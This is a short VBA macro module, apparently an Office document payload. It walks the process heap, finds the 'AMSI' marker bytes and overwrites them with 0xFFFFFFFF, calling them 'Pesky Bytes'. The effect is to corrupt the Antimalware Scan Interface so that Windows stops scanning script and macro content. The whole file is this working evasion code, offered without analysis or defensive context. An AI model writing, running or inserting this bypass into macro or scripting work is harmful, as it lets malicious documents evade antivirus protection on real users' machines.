Attribute VB_Name = "Module1"

Private Type PROCESS_HEAP_ENTRY
    lpData              As Long
    cbData              As Long
    cbOverhead          As Byte
    iRegionIndex        As Byte
    wFlags              As Integer
    dwCommittedSize     As Long
    dwUnCommittedSize   As Long
    lpFirstBlock        As Long
    lpLastBlock         As Long
End Type

Private Const PROCESS_HEAP_ENTRY_BUSY As Long = &H4
Private Const CRYPT_STRING_BINARY As Long = 2

Private Declare PtrSafe Function GetProcessHeaps Lib "kernel32" (ByVal NumberOfHeaps As Long, ByRef ProcessHeaps As Any) As Long
Private Declare PtrSafe Function HeapWalk Lib "kernel32" (ByVal hHeap As Long, ByRef lpEntry As PROCESS_HEAP_ENTRY) As Long
Private Declare PtrSafe Function ToString Lib "crypt32.dll" Alias "CryptBinaryToStringA" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, ByRef pcchString As Long) As Long

Sub HeapsOfFun()

    Dim ProcessHeaps As Long
    Dim NumberOfHeaps As Long
    Dim PHE As PROCESS_HEAP_ENTRY

    Dim ReadBuffer As Long
    Dim WriteBuffer As Long

    WriteBuffer = &HFFFFFFFF

    PHE.lpData = 0
    NumberOfHeaps = GetProcessHeaps(1, ProcessHeaps)
       
    retVal = HeapWalk(ProcessHeaps, PHE)
      
    Do While HeapWalk(ProcessHeaps, PHE) <> 0
        If ((PHE.wFlags And PROCESS_HEAP_ENTRY_BUSY) <> 0) And (1 = 1) Then

            ToString ByVal PHE.lpData, ByVal 4, CRYPT_STRING_BINARY, ByVal VarPtr(ReadBuffer), ByVal VarPtr(Len(ReadBuffer))
            If ReadBuffer = &H49534D41 Then
                Debug.Print "Pesky Bytes found on the Heap at: " & Hex(PHE.lpData)
                ToString ByVal VarPtr(WriteBuffer), ByVal 4, CRYPT_STRING_BINARY, ByVal PHE.lpData, ByVal VarPtr(Len(PHE.lpData))
                Debug.Print "Replaced Pesky Bytes found on the Heap at: " & Hex(PHE.lpData) & " with " & Hex(WriteBuffer)
                Exit Do
            End If

        End If
    Loop
    
End Sub

